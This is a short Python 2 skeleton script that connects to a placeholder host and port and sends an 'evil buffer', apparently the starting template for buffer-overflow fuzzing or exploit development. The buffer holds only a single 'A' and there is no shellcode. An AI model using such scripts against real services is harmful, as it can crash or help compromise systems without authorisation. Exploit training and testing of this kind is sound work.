#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A'

try:
     print "sending evil buffer..."
     s.connect(('IP_HERE','PORT_HERE'))
     data = s.recv(1024)
     s.send(buffer + '\r\n')
     print "\nDone!"

except:
     print "can not connect to service"